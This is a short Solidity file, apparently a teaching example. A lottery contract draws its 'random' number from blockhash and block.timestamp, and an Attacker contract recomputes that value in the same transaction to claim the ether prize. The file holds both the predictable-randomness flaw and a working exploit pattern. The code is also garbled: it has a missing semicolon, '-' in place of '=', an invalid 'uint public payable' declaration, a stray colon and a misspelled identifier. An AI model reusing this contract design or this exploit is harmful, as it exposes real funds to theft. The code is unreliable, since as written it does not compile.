pragma solidity ^0.8.4;

contract GuessTheRandomNumber {
  constructor() public payable{}

  function guess(uint _guess) public {
    uint answer = uint(keccak256(abi.encodePacked(
      blockhash(block.number - 1),
      block.timestamp
    )))

    if(_guess == answer) {
      (bool sent, ) - msg.sender.call{value: 1 ether}("");
      require(sent, "Failed to send Ether");
    }
  }
}

contract Attacker {
  uint public payable owner;

  fallback() external payable{
    owner.transfer(address(this).balance);
  }:

  constructor(){
    owner = payable(msg.sender);
  }

  function attack(GuessTheRandomNumber guessTheRandomNumber) public {
    uint answer = uint(keccak256(abi.encodePacked(
      blockhash(block.number - 1),
      block.timestamp
    )));

    guessTherandomNumber.guess(answer);
  }
}